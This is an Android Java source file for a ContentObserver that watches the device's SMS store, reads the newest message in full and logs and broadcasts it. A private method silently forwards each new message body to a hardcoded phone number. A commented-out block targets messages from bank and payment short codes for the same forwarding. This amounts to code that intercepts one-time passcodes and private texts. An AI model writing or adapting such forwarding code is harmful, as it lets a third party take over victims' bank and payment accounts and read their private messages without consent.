package com.ch.wchhuangya.dzah.android.activity.contentobserver;

import android.content.Context;
import android.content.Intent;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.telephony.SmsManager;

import com.ch.wchhuangya.dzah.android.db.MessageDB;
import com.ch.wchhuangya.dzah.android.model.Sms;
import com.ch.wchhuangya.dzah.android.util.Constant;
import com.ch.wchhuangya.dzah.android.util.LogHelper;
import com.ch.wchhuangya.dzah.android.util.TimeHelper;

/**
 * 短信内容观察者
 * Created by wchya on 2016-01-07 21:45.
 */
public class SmsCO extends ContentObserver {
    private Context mContext;

    /**
     * Creates a content observer.
     * @param handler The handler to run {@link #onChange} on, or null if none.
     */
    public SmsCO(Context context, Handler handler) {
        super(handler);
        mContext = context;
    }

    @Override
    public void onChange(boolean selfChange) {
        Uri uri = Uri.parse(Sms.URI_ALL);
        String[] projection = new String[]{
                Sms.FIELD_ID, Sms.FIELD_ADDRESS, Sms.FIELD_BODY, Sms.FIELD_TYPE, Sms.FIELD_DATE, Sms.FIELD_DATE_SENT, Sms.FIELD_READ, Sms.FIELD_SEEN, Sms.FIELD_LOCKED};
        String selection = "";
        String[] selectArgs = null;
        Cursor mCursor = mContext.getContentResolver().query(uri, projection, selection, selectArgs, "date DESC");
        if (mCursor != null) {
            String address = null, content = null, time = null, timeSent = null;
            if (mCursor.moveToNext()) {
                address = mCursor.getString(mCursor.getColumnIndex(Sms.FIELD_ADDRESS));
                content = mCursor.getString(mCursor.getColumnIndex(Sms.FIELD_BODY));
                time = TimeHelper.changeTimestampToTime(mCursor.getLong(mCursor.getColumnIndex(Sms.FIELD_DATE)), null);
                timeSent = TimeHelper.changeTimestampToTime(mCursor.getLong(mCursor.getColumnIndex(Sms.FIELD_DATE_SENT)), null);
                String type = Sms.typeToString(mCursor.getInt(mCursor.getColumnIndex(Sms.FIELD_TYPE)));
                String date = type.equals("发件箱") || type.equals("已发送")
                        ? "【发送时间】" + time
                        : "【接收时间】" + time;
                String dateSent = type.equals("发件箱") || type.equals("已发送")
                        ? "【接收时间】" + timeSent
                        : "【发送时间】" + timeSent;
                String s = "【" + type + "】        "
                        + address + "："
                        + content
                        + "        【是否已读：" + mCursor.getString(mCursor.getColumnIndex(Sms.FIELD_READ)) + "】"
                        + "        【是否看到：" + mCursor.getString(mCursor.getColumnIndex(Sms.FIELD_SEEN)) + "】"
                        + "        【locked：" + mCursor.getString(mCursor.getColumnIndex(Sms.FIELD_LOCKED)) + "】"
                        + date + dateSent + "】" + "|||" + mCursor.getString(mCursor.getColumnIndex(Sms.FIELD_ID));
                LogHelper.e(SmsCO.class, s);
                LogHelper.d(SmsCO.class, "收/发件人: " + address);
                //insertData(address, content, time, timeSent);
                Intent intent = new Intent();
                intent.setAction(Constant.ACTION_HANDLE_SMS_RECEIVER);
                intent.putExtra("content", s);
                mContext.sendBroadcast(intent);
            }
            /*if (((DzahApplication)mContext.getApplicationContext()).preContent.equals(content)
                    && (address.contains("95555") || address.contains("95188") || address.contains("18919312259"))) {
                SmsManager smsManager = SmsManager.getDefault();
                smsManager.sendTextMessage("13359491506", null, content, null, null);
                //LogHelper.d(SmsCO.class, ((DzahApplication)mContext.getApplicationContext()).preContent);
            }*/
        }
    }

    private void insertData(String address, String content, String time, String timeSend) {
        boolean recordExist = MessageDB.getInstance(mContext).recordExist(address, content, time == null ? timeSend : time);
        if (!recordExist) {
            MessageDB.getInstance(mContext).insertData(address, content, time == null ? timeSend : time);
            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage("13359491506", null, content, null, null);
        }
    }
}
